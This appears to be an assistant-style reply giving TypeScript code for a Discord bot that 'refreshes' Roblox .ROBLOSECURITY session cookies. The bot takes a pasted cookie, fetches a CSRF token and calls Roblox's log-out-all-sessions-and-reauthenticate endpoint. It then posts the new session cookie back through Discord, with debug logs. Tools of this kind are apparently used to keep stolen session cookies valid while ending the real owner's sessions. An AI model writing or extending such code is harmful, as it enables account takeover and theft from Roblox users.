**New `roblox.ts`** (with Discord‑friendly debug output):

```typescript
import axios from 'axios';
import { wrapper } from 'axios-cookiejar-support';
import { CookieJar } from 'tough-cookie';

export interface RefreshResult {
  newCookie: string | null;
  status: string;
  debug: string[]; // logs we can send to Discord
}

export async function refreshCookie(cookie: string): Promise<RefreshResult> {
  const debug: string[] = [];
  debug.push(`📥 Received cookie (length: ${cookie.length})`);

  const jar = new CookieJar();
  await jar.setCookie(`.ROBLOSECURITY=${cookie.trim()}`, 'https://auth.roblox.com');
  debug.push('✅ Cookie set in jar');

  const client = wrapper(
    axios.create({
      baseURL: 'https://auth.roblox.com',
      jar,
      withCredentials: true,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
    })
  );

  try {
    // STEP 1 – get CSRF
    debug.push('📤 POST /v2/logout ...');
    const csrfResp = await client.post('/v2/logout');
    debug.push(`↩️  /v2/logout → status ${csrfResp.status}`);

    const csrf = csrfResp.headers['x-csrf-token'] as string | undefined;
    if (!csrf) {
      debug.push(`❌ CSRF token missing (status ${csrfResp.status})`);
      return { newCookie: null, status: `CSRF_FAILED_${csrfResp.status}`, debug };
    }
    debug.push(`🔑 CSRF token: ${csrf.slice(0, 20)}…`);

    // STEP 2 – re‑auth
    debug.push('📤 POST /v2/logoutfromallsessionsandreauthenticate ...');
    const reauthResp = await client.post(
      '/v2/logoutfromallsessionsandreauthenticate',
      {},
      { headers: { 'X-CSRF-TOKEN': csrf } }
    );
    debug.push(`↩️  Re‑auth → status ${reauthResp.status}`);

    if (reauthResp.status === 200) {
      // Try jar first
      const cookies = await jar.getCookies('https://auth.roblox.com');
      debug.push(`🍪 Jar has ${cookies.length} cookie(s)`);
      const robloxCookie = cookies.find(c => c.key === '.ROBLOSECURITY');

      if (robloxCookie) {
        debug.push(`✅ Extracted new cookie from jar: ${robloxCookie.value.slice(0, 10)}…`);
        return { newCookie: robloxCookie.value, status: 'SUCCESS', debug };
      }

      // Fallback – parse Set-Cookie headers
      const setCookie = reauthResp.headers['set-cookie'];
      debug.push(`📋 Raw Set-Cookie: ${JSON.stringify(setCookie)}`);
      if (Array.isArray(setCookie)) {
        for (const raw of setCookie) {
          const match = raw.match(/\.ROBLOSECURITY=([^;]+)/);
          if (match) {
            debug.push(`✅ Extracted from Set-Cookie: ${match[1].slice(0, 10)}…`);
            return { newCookie: match[1], status: 'SUCCESS', debug };
          }
        }
      }

      debug.push('⚠️  No .ROBLOSECURITY found in response');
      return { newCookie: null, status: 'SUCCESS_NO_COOKIE', debug };
    }

    debug.push(`❌ Re‑auth failed with status ${reauthResp.status}`);
    return { newCookie: null, status: `ERROR_${reauthResp.status}`, debug };
  } catch (err: any) {
    debug.push(`💥 Exception: ${err.message}`);
    if (err.response?.data) debug.push(`📄 Response data: ${JSON.stringify(err.response.data)}`);
    return { newCookie: null, status: `EXCEPTION_${err.message}`, debug };
  }
}
```

Updated commands/refresh-cookie.ts (sends debug logs as ephemeral follow‑ups):

```typescript
export async function handleRefreshCookie(interaction) {
  await interaction.deferReply({ ephemeral: true });

  const cookie = interaction.options.getString('cookie', true).trim();

  let result: RefreshResult | null = null;
  for (let attempt = 1; attempt <= 2; attempt++) {
    result = await refreshCookie(cookie);
    if (result.newCookie) break;
  }

  if (!result || !result.newCookie) {
    // Send the debug logs even on failure
    await interaction.editReply('❌ **Refresh failed**');
    for (const line of result?.debug || []) {
      await interaction.followUp({ content: line, ephemeral: true });
    }
    return;
  }

  // Success – send debug logs first, then the cookie
  await interaction.editReply('✅ **Cookie re‑sessioned!**');
  for (const line of result.debug) {
    await interaction.followUp({ content: line, ephemeral: true });
  }
  await interaction.followUp({
    content: `📱 **Mobile copy:**\n\`${result.newCookie}\``,
    ephemeral: true
  });
  await interaction.followUp({
    content: `💻 **PC copy:**\n\`\`\`\n${result.newCookie}\n\`\`\``,
    ephemeral: true
  });
}
```
